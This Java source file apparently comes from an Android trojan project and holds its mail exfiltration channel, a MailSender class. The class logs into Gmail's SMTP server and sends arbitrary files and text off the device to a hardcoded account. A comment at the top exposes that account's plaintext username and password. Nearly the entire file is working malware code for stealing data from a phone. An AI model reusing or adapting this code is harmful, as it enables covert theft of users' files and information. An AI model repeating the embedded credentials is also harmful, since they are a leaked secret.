package il.ac.colman.androidtrojan.Channels.Mail;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import android.util.Log;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.Security;
import java.util.Properties;

//username: android.trojan.colman@gmail.com
//password: Vnfkkvknbvk
public class MailSender extends javax.mail.Authenticator {
	final private String _username;
	final private String _password;
	private static final String TAG = "MailChannel";
	private Properties _props;
	private Session _session;

	static {
		Security.addProvider(new il.ac.colman.androidtrojan.Channels.Mail.JSSEProvider());
	}

	// ctor:
	public MailSender(String _username, String _password) {
		super();
		// setting fields:
		this._username = _username;
		this._password = _password;
		this._props = new Properties();

		// setting props:
		_props.setProperty("mail.transport.protocol", "smtp");
		_props.setProperty("mail.host", "smtp.gmail.com");
		_props.put("mail.smtp.auth", "true");
		_props.put("mail.smtp.port", "465");
		_props.put("mail.smtp.socketFactory.port", "465");
		_props.put("mail.smtp.socketFactory.class",
				"javax.net.ssl.SSLSocketFactory");
		_props.put("mail.smtp.socketFactory.fallback", "false");
		_props.setProperty("mail.smtp.quitwait", "false");

		// setting session:
		_session = Session.getDefaultInstance(_props, this);
	}

	protected void sendFile(String filePath, String fileName)
			throws MessagingException {
		// TODO Auto-generated method stub
		try {
			Message message = new MimeMessage(_session);
			message.setFrom(new InternetAddress(_username));
			message.setRecipient(Message.RecipientType.TO, new InternetAddress(
					_username));
			message.setSubject("File from android trojan!");
			message.setText("This is the file/ files:");

			MimeBodyPart messageBodyPart = new MimeBodyPart();

			Multipart multipart = new MimeMultipart();

			messageBodyPart = new MimeBodyPart();
			DataSource source = new FileDataSource(filePath);
			messageBodyPart.setDataHandler(new DataHandler(source));
			messageBodyPart.setFileName(fileName);
			multipart.addBodyPart(messageBodyPart);
			message.setContent(multipart);
			Transport.send(message);
		} catch (MessagingException e) {
			e.printStackTrace();
			Log.d(TAG, "Problem sending file by mail.");
		}
	}

	protected synchronized void sendString(String text) throws Exception {
		// TODO Auto-generated method stub
		try {
			MimeMessage message = new MimeMessage(_session);
			DataHandler handler = new DataHandler(new ByteArrayDataSource(
					text.getBytes(), "text/plain"));
			message.setSender(new InternetAddress(_username));
			message.setSubject("This is a text sended from the android trojan!");
			message.setDataHandler(handler);
			message.setRecipient(Message.RecipientType.TO, new InternetAddress(
					_username));

			Transport.send(message);
		} catch (Exception e) {
			Log.d(TAG, "Problem sending string by mail.");
		}
	}

	// methods:
	protected PasswordAuthentication getPasswordAuthentication() {
		return new PasswordAuthentication(_username, _password);
	}

	// internal classes:
	public class ByteArrayDataSource implements DataSource {
		private byte[] data;
		private String type;

		public ByteArrayDataSource(byte[] data, String type) {
			super();
			this.data = data;
			this.type = type;
		}

		public ByteArrayDataSource(byte[] data) {
			super();
			this.data = data;
		}

		public void setType(String type) {
			this.type = type;
		}

		public String getContentType() {
			if (type == null)
				return "application/octet-stream";
			else
				return type;
		}

		public InputStream getInputStream() throws IOException {
			return new ByteArrayInputStream(data);
		}

		public String getName() {
			return "ByteArrayDataSource";
		}

		public OutputStream getOutputStream() throws IOException {
			throw new IOException("Not Supported");
		}
	}
}
